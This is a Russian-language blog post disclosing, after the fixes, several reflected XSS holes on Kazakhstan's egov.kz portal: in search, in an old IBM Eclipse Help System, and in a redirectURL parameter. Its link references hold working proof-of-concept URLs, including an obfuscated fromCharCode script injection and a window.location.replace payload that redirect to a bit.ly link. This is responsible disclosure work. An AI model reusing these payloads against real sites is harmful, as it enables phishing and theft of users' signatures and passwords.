---
layout: post
title: "Уязвимость на сайте egov.kz (XSS)"
date: '2017-6-8T13:24:14+06:00'
categories: xss security
about: 'about.html'
---
Про эти проблемы я сообщил press@nitec.kz более года назад. Многие проблемы они устранили, ~~но не всё~~. Думаю пришло время дисклозить.
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

Очень важно, чтобы главный портал государственных услуг был без уязвимостей. XSS это еще одна возможность для мошенников производить фишинг атаки на пользователей. Ниже в посте есть видео кражи ЭЦП.

В посте описаны не все найденные уязвимости. Стоит отметить, что egov.kz отвечает на письма и исправляет проблемы. Но следующие XSS обещали исправить еще 31 Марта 2016 года.


+ Reflected XSS через Поиск - ~~не исправлено~~ исправлено 14-06-2017

Обычно XSS на сайтах чаще можно найти через Search.
![image][img0]
 
Egov.kz не исключение. Вот результат такого запроса.
![image][img1]

**Proof of Concept**: [XSS через Поиск]


+ Reflected XSS через IBM Eclipse Help System - ~~не исправлено~~ исправлено 14-06-2017

Похоже, что egov.kz использует старый IBM WebSphere вперемешку с Drupal.
![image][img2]
![image][img3]

Для старого WebSphere есть [старый XSS]. Остается надеяться, что egov.kz устанавливает другие патчи на WebSphere.
![image][img4]

**Proof of Concept**: [XSS через IEHS]


+ XSS на idp.egov.kz - исправлено. 

Здесь параметр redirectURL не был обработан.
![image][img5]

На видео ниже, ЭЦП и пароль пользователя отправляются на localhost. Все работает по HTTPS.

<iframe src="https://player.vimeo.com/video/166616876" width="640" height="480" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>

Все примеры выше выполняется в контексте javascript кода. То есть, XSS аудиторы современных браузеров бессильны. Кстати, не знаю зачем мошенникам пароли, ведь пароль всех ЭЦП **123456** :)

[XSS через Поиск]: http://egov.kz/wps/portal/!ut/p/b1/jY7LCsIwFES_qNxJLq3JMj7SBKVBKGizkSxECn1sSr_f2r3V2Q2cwwxFajItUEBKxXSnOKS5faWpHYfUfXosHjuGVHthEBiAr_VBq2vNJWMBmgUITtgy14xwVCd4lXNlL07iLP_z8SUGv_wbxRXZerACGxOVG_sn9bGz2mfmDbEtbmo!/dl4/d5/L2dBISEvZ0FBIS9nQSEh/pw/Z7_73028B1A003DC0AS22M7DL2003/act/id=0/p=from=0/p=lang=all/p=textSearch=x';document.write(String.fromCharCode(60,115,99,114,105,112,116,62,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,98,105,116,46,108,121,47,73,113,84,54,122,116,34,60,47,115,99,114,105,112,116,62));'/p=category=all/318769911448/-/
[старый XSS]: http://www.securityfocus.com/bid/54051/info
[XSS через IEHS]: http://egov.kz/wps/iehs/topic/com");}window.location.replace("//bit.ly/IqT6zt");//.htm
[img0]: /assets/images/{{page.slug}}/img0.png
[img1]: /assets/images/{{page.slug}}/img1.png
[img2]: /assets/images/{{page.slug}}/img2.png
[img3]: /assets/images/{{page.slug}}/img3.png
[img4]: /assets/images/{{page.slug}}/img4.png
[img5]: /assets/images/{{page.slug}}/img5.png